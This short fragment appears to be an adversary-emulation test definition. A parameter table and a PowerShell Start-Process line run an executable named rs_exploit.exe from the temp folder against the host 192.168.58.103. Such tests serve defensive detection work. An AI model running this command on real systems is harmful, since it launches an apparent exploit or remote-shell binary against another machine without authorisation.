<<parameters
Name	Description	Type	Default Value
file_folder	folder to the file	String	$env:TEMP
file_name	file name	String	rs_exploit.exe
arguments	arguments	String	/S 192.168.58.103
parameters

Start-Process -FilePath "#{file_folder}\#{file_name}" -ArgumentList "#{arguments}"

